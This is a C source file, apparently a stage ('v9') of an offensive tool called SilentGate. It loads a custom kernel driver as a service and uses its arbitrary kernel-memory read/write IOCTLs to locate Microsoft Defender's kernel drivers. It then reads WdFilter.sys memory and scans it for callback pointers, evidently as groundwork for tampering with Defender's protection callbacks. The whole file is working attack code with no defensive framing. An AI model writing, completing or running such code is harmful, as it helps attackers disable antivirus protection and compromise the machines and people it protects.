#include <windows.h>
#include <psapi.h>
#include <stdio.h>

#define IOCTL_SG_READ_VIRTUAL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SG_WRITE_VIRTUAL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
typedef struct { ULONG64 address; ULONG size; UCHAR data[256]; } SG_MEM;
static HANDLE g_h = INVALID_HANDLE_VALUE;

BOOL vm_read(ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM req={0}; req.address=addr; req.size=size<256?size:256;
    DWORD bytes=0;
    return DeviceIoControl(g_h,IOCTL_SG_READ_VIRTUAL,
        &req,sizeof(req),buf,size,&bytes,NULL);
}

BOOL vm_write(ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM req={0}; req.address=addr; req.size=size<256?size:256;
    if(req.size>0) memcpy(req.data,buf,req.size);
    DWORD bytes=0;
    return DeviceIoControl(g_h,IOCTL_SG_WRITE_VIRTUAL,
        &req,sizeof(req),&req,sizeof(req),&bytes,NULL);
}

int load_driver(const char* path) {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE ex=OpenServiceA(scm,"SilentGate",SERVICE_ALL_ACCESS);
    if(ex){SERVICE_STATUS ss;ControlService(ex,SERVICE_CONTROL_STOP,&ss);
        DeleteService(ex);CloseServiceHandle(ex);Sleep(500);}
    SC_HANDLE svc=CreateServiceA(scm,"SilentGate","SilentGate",
        SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,path,NULL,NULL,NULL,NULL,NULL);
    if(!svc){CloseServiceHandle(scm);return 0;}
    BOOL ok=StartServiceA(svc,0,NULL);
    CloseServiceHandle(svc);CloseServiceHandle(scm);
    return ok;
}

void unload_driver() {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE svc=OpenServiceA(scm,"SilentGate",SERVICE_ALL_ACCESS);
    if(svc){SERVICE_STATUS ss;ControlService(svc,SERVICE_CONTROL_STOP,&ss);
        Sleep(500);DeleteService(svc);CloseServiceHandle(svc);}
    CloseServiceHandle(scm);
}

int main() {
    printf("[V9] SilentGate v9.0 - Find WdFilter Base\n");
    printf("[V9] Author: JarDani\n\n");

    char drv[MAX_PATH],dir[MAX_PATH];
    GetModuleFileNameA(NULL,dir,MAX_PATH);
    char* p=strrchr(dir,'\\');if(p)*p='\0';
    snprintf(drv,MAX_PATH,"%s\\sg_driver.sys",dir);

    if(!load_driver(drv)){printf("Load failed\n");getchar();return 1;}
    g_h=CreateFileA("\\\\.\\SilentGate",GENERIC_READ|GENERIC_WRITE,0,NULL,
        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

    /* List all loaded drivers and find Defender ones */
    DWORD n=0;
    EnumDeviceDrivers(NULL,0,&n);
    LPVOID* d=(LPVOID*)malloc(n);
    EnumDeviceDrivers(d,n,&n);

    printf("[V9] Defender drivers in kernel:\n");
    DWORD64 wdfilter_base=0, wdnisdrv_base=0;

    char name[MAX_PATH];
    for(DWORD i=0;i<n/sizeof(LPVOID);i++){
        GetDeviceDriverBaseNameA(d[i],name,MAX_PATH);
        if(_stricmp(name,"WdFilter.sys")==0){
            wdfilter_base=(DWORD64)d[i];
            printf("[V9] WdFilter.sys  base=0x%llX\n",wdfilter_base);
        }
        if(_stricmp(name,"WdNisDrv.sys")==0){
            wdnisdrv_base=(DWORD64)d[i];
            printf("[V9] WdNisDrv.sys  base=0x%llX\n",wdnisdrv_base);
        }
        if(_stricmp(name,"MpKslDrv.sys")==0){
            printf("[V9] MpKslDrv.sys  base=0x%llX\n",(DWORD64)d[i]);
        }
    }
    free(d);

    if(!wdfilter_base){
        printf("[V9] WdFilter not found\n");
        CloseHandle(g_h); unload_driver();
        getchar(); return 1;
    }

    printf("\n[V9] Reading WdFilter MZ header to verify access:\n");
    BYTE buf[8]={0};
    if(vm_read(wdfilter_base,buf,8)){
        printf("[V9] %02X %02X %02X %02X\n",buf[0],buf[1],buf[2],buf[3]);
        if(buf[0]==0x4D&&buf[1]==0x5A)
            printf("[V9] WdFilter MZ confirmed - can read Defender memory\n");
    } else {
        printf("[V9] Cannot read WdFilter memory\n");
    }

    /* Now scan WdFilter for ObRegisterCallbacks patterns */
    /* ObRegisterCallbacks stores callbacks in _OB_CALLBACK_CONTEXT */
    /* We look for WdFilter's callback registration */
    printf("\n[V9] Scanning WdFilter for callback pointers...\n");

    /* Read first 0x200 bytes of WdFilter looking for kernel addresses */
    BYTE scan[512]={0};
    vm_read(wdfilter_base, scan, 512);

    int ptr_count=0;
    for(int i=0;i<504;i+=8){
        DWORD64 val=*(DWORD64*)&scan[i];
        /* Look for pointers back into WdFilter itself */
        if(val>=wdfilter_base && val<wdfilter_base+0x400000){
            printf("[V9] WdFilter self-ref at +0x%X: 0x%llX\n",i,val);
            ptr_count++;
        }
    }
    printf("[V9] Found %d self-references\n",ptr_count);

    CloseHandle(g_h);
    unload_driver();
    printf("\n[V9] Done - press Enter\n");
    getchar();
    return 0;
}
